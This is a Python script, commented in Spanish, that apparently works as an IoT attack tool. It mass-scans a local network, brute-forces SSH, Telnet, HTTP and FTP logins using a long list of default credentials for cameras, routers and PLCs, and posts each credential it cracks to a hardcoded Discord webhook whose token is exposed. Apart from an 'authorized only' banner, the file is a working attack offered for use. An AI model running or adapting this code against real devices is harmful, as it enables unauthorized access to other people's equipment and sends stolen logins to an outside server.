#!/usr/bin/env python3
"""
IoT Ultra Fast Scanner - REAL y RÁPIDO
SOLO PARA REDES AUTORIZADAS
"""

import asyncio
import aiohttp
import socket
import ipaddress
from concurrent.futures import ThreadPoolExecutor, as_completed
import paramiko
import telnetlib
import requests
import ftplib
from datetime import datetime
import time
import sys

# ============================
# CONFIGURACIÓN ULTRA RÁPIDA
# ============================
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466196642322710780/cK9VMedmPzrlsCo_sBTQXREQTuoIIf3oKBgn0JIOykLTh7gsOFEtDdk_0jNTviyre-pZ"
NETWORK = "192.168.1.0/24"
MAX_WORKERS = 300  # Máximo de hilos
PORT_TIMEOUT = 0.3  # 300ms por puerto
AUTH_TIMEOUT = 1  # 1 segundo por autenticación

# ============================
# PUERTOS CRÍTICOS
# ============================
PORTS = [22, 23, 80, 443, 554, 21, 3306, 8080, 8888, 3389]

# ============================
# CREDENCIALES REALES MASIVAS
# ============================
CREDS = [
    # ADMIN VARIATIONS
    ("admin", "admin"), ("admin", "admin123"), ("admin", "admin1234"),
    ("admin", "password"), ("admin", "password123"), ("admin", "pass"),
    ("admin", "pass123"), ("admin", "1234"), ("admin", "12345"),
    ("admin", "123456"), ("admin", "12345678"), ("admin", "123456789"),
    ("admin", "1111"), ("admin", "111111"), ("admin", "0000"),
    ("admin", "000000"), ("admin", ""), ("administrator", "password"),
    
    # ROOT VARIATIONS
    ("root", "root"), ("root", "toor"), ("root", "1234"),
    ("root", "12345"), ("root", "123456"), ("root", "password"),
    ("root", "pass"), ("root", ""), ("root", "root123"),
    
    # USER VARIATIONS
    ("user", "user"), ("user", "user123"), ("user", "1234"),
    ("user", "12345"), ("user", "password"), ("user", ""),
    
    # TECHNICAL USERS
    ("support", "support"), ("support", "1234"), ("service", "service"),
    ("service", "1234"), ("operator", "operator"), ("operator", "1234"),
    ("tech", "tech"), ("tech", "1234"), ("test", "test"),
    
    # DEVICE SPECIFIC
    ("ubnt", "ubnt"),  # Ubiquiti
    ("mikrotik", "mikrotik"),  # MikroTik
    ("dahua", "dahua"),  # Dahua cameras
    ("hikvision", "hikvision"),  # Hikvision
    ("hikvision", "12345"),  # Hikvision default
    ("admin", "12345"),  # Hikvision common
    ("admin", "1111"),  # D-Link
    ("admin", "admin1234"),  # D-Link
    ("admin", "4321"),  # D-Link
    ("cisco", "cisco"),  # Cisco
    ("guest", "guest"),  # Guest access
    ("ftp", "ftp"),  # FTP default
    ("anonymous", ""),  # FTP anonymous
    
    # EMPTY PASSWORDS
    ("admin", None),  # No password
    ("root", None),
    ("user", None),
    ("guest", None),
    
    # CAMERA DEFAULTS
    ("admin", "9999"),  # Some cameras
    ("admin", "888888"),  # Some DVRs
    ("admin", "666666"),  # Chinese devices
    ("supervisor", "supervisor"),  # GeoVision
    ("supervisor", "123456"),  # GeoVision
    
    # INDUSTRIAL
    ("operator", "operator123"),
    ("admin", "1001"),  # PLC defaults
    ("admin", "1111111"),
    
    # COMMON COMBINATIONS
    ("admin", "admin@123"),
    ("admin", "Admin"),
    ("admin", "Admin123"),
    ("admin", "administrator"),
    
    # SECURITY SYSTEMS
    ("installer", "installer"),
    ("maintenance", "maintenance"),
    ("security", "security"),
    ("monitor", "monitor"),
    
    # ROUTERS/MODEMS
    ("user", "user"),  # ZTE
    ("user", "password"),  # Huawei
    ("admin", "telecom"),  # Some ISPs
    ("admin", "admintelecom"),
    
    # DATABASE
    ("mysql", "mysql"),
    ("root", "mysql"),
    
    # BLANK USERNAMES
    ("", "admin"),
    ("", "password"),
    ("", "1234"),
]

class UltraFastScanner:
    def __init__(self):
        self.found = []
        
    async def discord_alert(self, ip: str, port: int, service: str, user: str, pwd: str):
        """Alerta rápida a Discord"""
        try:
            payload = {
                "embeds": [{
                    "title": "🔓 CREDS FOUND",
                    "description": f"```{service.upper()}://{user}:{pwd}@{ip}:{port}```",
                    "color": 3066993,
                    "timestamp": datetime.utcnow().isoformat()
                }]
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(DISCORD_WEBHOOK, json=payload, timeout=2):
                    pass
        except:
            pass
    
    def port_check(self, ip_port):
        """Check único puerto - SUPER RÁPIDO"""
        ip, port = ip_port
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(PORT_TIMEOUT)
            result = sock.connect_ex((ip, port))
            sock.close()
            return (ip, port) if result == 0 else None
        except:
            return None
    
    def mass_port_scan(self):
        """Escaneo MASIVO de puertos paralelo"""
        print(f"[*] Escaneo rápido de {NETWORK}")
        
        # Generar todos los objetivos
        targets = []
        for ip in ipaddress.ip_network(NETWORK).hosts():
            ip_str = str(ip)
            for port in PORTS:
                targets.append((ip_str, port))
        
        # Escaneo paralelo MASIVO
        open_ports = []
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = [executor.submit(self.port_check, target) for target in targets]
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    ip, port = result
                    open_ports.append((ip, port))
                    print(f"[+] OPEN: {ip}:{port}")
        
        return open_ports
    
    def test_ssh_fast(self, ip: str, port: int, user: str, pwd: str):
        """SSH rápido"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=port, username=user, 
                       password=pwd if pwd else "",
                       timeout=AUTH_TIMEOUT, banner_timeout=AUTH_TIMEOUT,
                       auth_timeout=AUTH_TIMEOUT)
            ssh.close()
            return True
        except:
            return False
    
    def test_telnet_fast(self, ip: str, port: int, user: str, pwd: str):
        """Telnet rápido"""
        try:
            tn = telnetlib.Telnet(ip, port, timeout=AUTH_TIMEOUT)
            
            # Esperar login prompt
            tn.read_until(b"login:", timeout=1)
            tn.write(user.encode() + b"\n")
            
            # Esperar password prompt
            tn.read_until(b"password:", timeout=1)
            tn.write((pwd if pwd else "").encode() + b"\n")
            
            # Leer respuesta rápida
            time.sleep(0.1)
            result = tn.read_very_eager()
            tn.close()
            
            # Verificar si login fue exitoso
            if b"incorrect" not in result.lower() and b"fail" not in result.lower():
                return True
            return False
        except:
            return False
    
    def test_http_fast(self, ip: str, port: int, user: str, pwd: str):
        """HTTP básico rápido"""
        try:
            url = f"http://{ip}:{port}"
            response = requests.get(url, auth=(user, pwd if pwd else ""), 
                                  timeout=AUTH_TIMEOUT)
            return response.status_code != 401
        except:
            return False
    
    def test_ftp_fast(self, ip: str, port: int, user: str, pwd: str):
        """FTP rápido"""
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, port, timeout=AUTH_TIMEOUT)
            ftp.login(user, pwd if pwd else "")
            ftp.quit()
            return True
        except:
            return False
    
    def brute_device_fast(self, ip: str, port: int):
        """Brute force RÁPIDO a un dispositivo"""
        service = {
            22: "ssh", 23: "telnet", 21: "ftp",
            80: "http", 443: "https", 8080: "http",
            8888: "http", 3306: "mysql", 554: "rtsp"
        }.get(port, "unknown")
        
        print(f"[*] Probando {ip}:{port} ({service})")
        
        for user, pwd in CREDS:
            try:
                success = False
                
                if port == 22:  # SSH
                    success = self.test_ssh_fast(ip, port, user, pwd)
                elif port == 23:  # Telnet
                    success = self.test_telnet_fast(ip, port, user, pwd)
                elif port in [80, 443, 8080, 8888]:  # HTTP/HTTPS
                    success = self.test_http_fast(ip, port, user, pwd)
                elif port == 21:  # FTP
                    success = self.test_ftp_fast(ip, port, user, pwd)
                
                if success:
                    cred_str = f"{user}:{pwd if pwd else '(empty)'}"
                    print(f"[!] CREDS FOUND: {ip}:{port} - {cred_str}")
                    
                    # Alerta inmediata
                    asyncio.create_task(
                        self.discord_alert(ip, port, service, user, pwd)
                    )
                    
                    return True
                    
            except Exception as e:
                continue
        
        return False
    
    async def run_fast_scan(self):
        """Ejecuta escaneo completo ULTRA RÁPIDO"""
        print(f"[*] Iniciando escaneo rápido con {MAX_WORKERS} hilos")
        print(f"[*] Credenciales: {len(CREDS)} combinaciones")
        print(f"[*] Puertos: {PORTS}")
        
        start_time = time.time()
        
        # 1. Escaneo masivo de puertos
        open_ports = self.mass_port_scan()
        print(f"[*] {len(open_ports)} puertos abiertos encontrados")
        
        # 2. Ataque paralelo a todos los dispositivos
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for ip, port in open_ports:
                future = executor.submit(self.brute_device_fast, ip, port)
                futures.append(future)
            
            # Esperar resultados
            for future in as_completed(futures):
                try:
                    future.result(timeout=10)
                except:
                    pass
        
        elapsed = time.time() - start_time
        print(f"[*] Escaneo completado en {elapsed:.2f} segundos")

async def main():
    print("="*60)
    print("ULTRA FAST IoT SCANNER")
    print("SOLO PARA PRUEBAS AUTORIZADAS")
    print("="*60)
    
    scanner = UltraFastScanner()
    await scanner.run_fast_scan()

if __name__ == "__main__":
    # ADVERTENCIA FINAL
    import os
    if os.getuid() != 0:
        print("[!] Se recomienda ejecutar como root para mejor performance")
    
    asyncio.run(main())
